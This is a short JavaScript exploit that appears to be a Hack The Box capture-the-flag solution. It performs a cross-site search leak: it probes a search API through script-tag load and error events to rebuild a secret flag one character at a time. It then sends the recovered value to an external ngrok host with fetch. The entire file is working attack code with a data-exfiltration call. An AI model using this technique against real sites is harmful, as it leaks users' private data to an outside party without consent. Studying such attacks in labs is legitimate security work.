//var ip = '138.68.188.223:31773'; // HTB Server IP Address
var ip = '127.0.0.1:1337'; // HTB Server IP Address
var flag = 'Ba'; // init search word
var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-%';
var url = `http://${ip}/api/entries/search?q=`;
async function getLetter(ch){
  return new Promise((resolve, reject)=>{
    const script = document.createElement("script");
    script.src = url+encodeURIComponent(flag+ch);
    script.onload = () => ch==='}' ? reject(ch):resolve(ch);
    script.onerror = () => reject(ch);
    document.head.appendChild(script);
  });
}

async function fetching(flag){
  fetch(`https://62a1-157-100-198-203.ngrok.io/flag=${flag}`, { method: 'get' });
}


async function getFullWord(letters) {
  var b = false;
  for(var i=0; i < letters.length; i++){
    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='x' ? true:false; i=0} , (res)=> { } );
    if(b) break;
  }
  await fetching(flag);
  //fetch(`https://62a1-157-100-198-203.ngrok.io/flag=${flag}`, { method: 'get' });
  //fetch(`https://9141-157-100-198-203.ngrok.io/flag=${flag}`, { method: 'get' });
};
getFullWord(letters);